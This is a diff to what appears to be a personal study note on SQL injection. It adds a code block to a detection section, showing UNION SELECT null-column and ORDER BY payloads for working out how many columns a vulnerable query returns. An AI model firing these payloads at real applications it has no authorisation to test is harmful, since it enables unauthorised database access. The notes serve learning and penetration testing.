@@ -88,7 +88,15 @@ SELECT * FROM ports UNION SLECT * FROM ships;
 ### Detection
 1. Find a successful query
 2. Start adding 'null' columns until you no long recieve an errors  
+```
+# Add null columns until the app no longer errors out
 jeremy' union select null,null,null#
+
+# Order by - Unlike null columns, this method works until it fails. So you keep increasing the integer until the query errors out.
+jeremy' order by 1#
+jeremy' order by 2#
+etc...
+```
 3. Once you find the the correct number of columns, you can begin filling them with data.
 > :warning: Not all columns may be displayed. You may find 3 columns but it only display's 2 columns. Useful to note which columns are displayed
 
